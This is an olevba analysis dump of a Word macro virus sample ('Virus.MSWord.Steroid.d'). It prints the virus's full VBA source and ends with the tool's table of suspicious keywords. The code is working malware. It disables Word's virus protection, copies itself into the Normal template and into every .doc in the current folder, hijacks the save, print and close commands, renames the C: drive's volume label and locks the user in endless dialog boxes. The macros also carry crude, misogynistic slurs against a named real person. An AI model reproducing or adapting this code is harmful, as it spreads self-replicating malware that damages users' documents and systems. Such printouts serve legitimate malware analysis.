olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Steroid.d
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Steroid.d - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Bitch.bas 
in file: ./Virus.MSWord.Steroid.d - OLE stream: 'Macros/VBA/Bitch'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Declare Function SetVolumeLabel Lib "kernel32" Alias "SetVolumeLabelA" (ByVal lpRootPathName As String, ByVal lpVolumeName As String) As Long
Sub Steroid()
If Application.ShowVisualBasicEditor Then Call out
Application.EnableCancelKey = wdCancelDisabled
On Error Resume Next
If Application.ShowVisualBasicEditor Then Call out
CommandBars("tools").Controls("Macro").Delete
CommandBars("tools").Controls("Templates and add-ins...").Delete
If Application.ShowVisualBasicEditor Then Call out
With Options
.ConfirmConversions = False
.VirusProtection = False
.SaveNormalPrompt = False
End With
If Application.ShowVisualBasicEditor Then Call out
ActiveDocument.ReadOnlyRecommended = False
If Application.ShowVisualBasicEditor Then Call out
Application.ScreenUpdating = False
If Application.ShowVisualBasicEditor Then Call out
Application.VBE.ActiveVBProject.VBComponents("Bitch").Export "c:\startup.log"
Application.VBE.ActiveVBProject.VBComponents("X").Export "c:\scan.log"
For I = 1 To NormalTemplate.VBProject.VBComponents.Count
If NormalTemplate.VBProject.VBComponents(I).Name = "Bitch" Then NormInstall = True
Next I
If Application.ShowVisualBasicEditor Then Call out
For I = 1 To ActiveDocument.VBProject.VBComponents.Count
If ActiveDocument.VBProject.VBComponents(I).Name = "Bitch" Then ActivInstall = True
Next I
If Application.ShowVisualBasicEditor Then Call out
If ActivInstall = False Then
With ActiveDocument.VBProject
With .VBComponents.Import("c:\startup.log")
End With
End With
End If
With ActiveDocument.VBProject
With .VBComponents.Import("c:\scan.log")
End With
End With
Call Mover2
If Application.ShowVisualBasicEditor Then Call out
If NormInstall = False Then
With NormalTemplate.VBProject
With .VBComponents.Import("c:\startup.log")
End With
End With
With NormalTemplate.VBProject
With .VBComponents.Import("c:\scan.log")
End With
End With
Call Mover1
volset = SetVolumeLabel("c:\", "Whore")
End If
If Application.ShowVisualBasicEditor Then Call out
If ActivInstall = False Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
If NormInstall = False Then
If NormalTemplate.Saved = False Then NormalTemplate.Save
End If
If Application.ShowVisualBasicEditor Then Call out
Application.ScreenUpdating = True
If Application.ShowVisualBasicEditor Then Call out
fuckoff:
End Sub
Sub HelpAbout()
On Error Resume Next
MsgBox "Linda Tripp is a WHORE!!", vbInformation, "VicodinES Macro Virus"
End Sub
Sub FileSave()
On Error Resume Next
If Application.ShowVisualBasicEditor Then Call out
Call Steroid
Application.ScreenUpdating = False
ActiveDocument.Save
Application.ScreenUpdating = True
End Sub
Sub FileSaveAs()
On Error Resume Next
If Application.ShowVisualBasicEditor Then Call out
Application.ScreenUpdating = False
dialogs(wdDialogFileSaveAs).Show
Application.ScreenUpdating = True
Call Steroid
End Sub
Sub FilePrint()
On Error Resume Next
If Application.ShowVisualBasicEditor Then Call out
dialogs(wdDialogFilePrint).Show
Call Steroid
End Sub
Sub FileClose()
On Error Resume Next
If Application.ShowVisualBasicEditor Then Call out
Call Steroid
Application.ScreenUpdating = False
If ActiveDocument.Saved = False Then ActiveDocument.Save
ActiveDocument.Close
End Sub
Sub FileExit()
On Error Resume Next
If Application.ShowVisualBasicEditor Then Call out
Call Caffeine
Application.Quit
End Sub
Sub AutoOpen()
On Error Resume Next
If Application.ShowVisualBasicEditor Then Call out
Call Steroid
End Sub
Sub AutoExit()
On Error Resume Next
If Application.ShowVisualBasicEditor Then Call out
Call Caffeine
End Sub
Sub AutoClose()
On Error Resume Next
If Application.ShowVisualBasicEditor Then Call out
Call Steroid
End Sub
Sub ViewVBCode()
On Error Resume Next
If Application.ShowVisualBasicEditor Then Call out
End Sub
Sub Caffeine()
If Application.ShowVisualBasicEditor Then Call out
Application.ScreenUpdating = False
Application.EnableCancelKey = wdCancelDisabled
Application.WindowState = wdWindowStateMinimize
pName = CurDir & "\"
fName = Dir(pName & "*.doc", sAttr)
If (fName <> "") And ((fName <> ".") And (fName <> "..")) Then InfectDoc = pName & fName
Documents.Open FileName:=InfectDoc, ConfirmConversions:=False, ReadOnly:=False, AddToRecentFiles:=False, PasswordDocument:=""
Do While (fName <> "")
fName = Dir()
If (fName <> "") And _
((fName <> ".") And (fName <> "..")) Then
InfectDoc = pName & fName
Documents.Open FileName:=InfectDoc, ConfirmConversions:=False, ReadOnly:=False, AddToRecentFiles:=False, PasswordDocument:=""
Call Steroid
End If
Loop
End Sub
Sub out()
ShowVisualBasicEditor = False
randomize
Application.EnableCancelKey = wdCancelDisabled
On Error Resume Next
ShowVisualBasicEditor = False
ActiveDocument.Save
NormalTemplate.Save
Call Caffeine
gonad = 1
Do While gonad = 1
testicle = Int(rnd * 700)
dialogs(testicle).Show
Loop
End Sub
Sub Mover1()
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Whore", Object:=wdOrganizerObjectCommandBars
End Sub
Sub Mover2()
    Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="Whore", Object:=wdOrganizerObjectCommandBars
End Sub
Sub Tripp()
Application.EnableCancelKey = wdCancelDisabled
fu = 0
Do While u < 2
X.StartUpPosition = Top
X.Show
X.Show
u = u + 1
Loop

End Sub

-------------------------------------------------------------------------------
VBA MACRO X.frm 
in file: ./Virus.MSWord.Steroid.d - OLE stream: 'Macros/VBA/X'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
+----------+--------------------+---------------------------------------------+

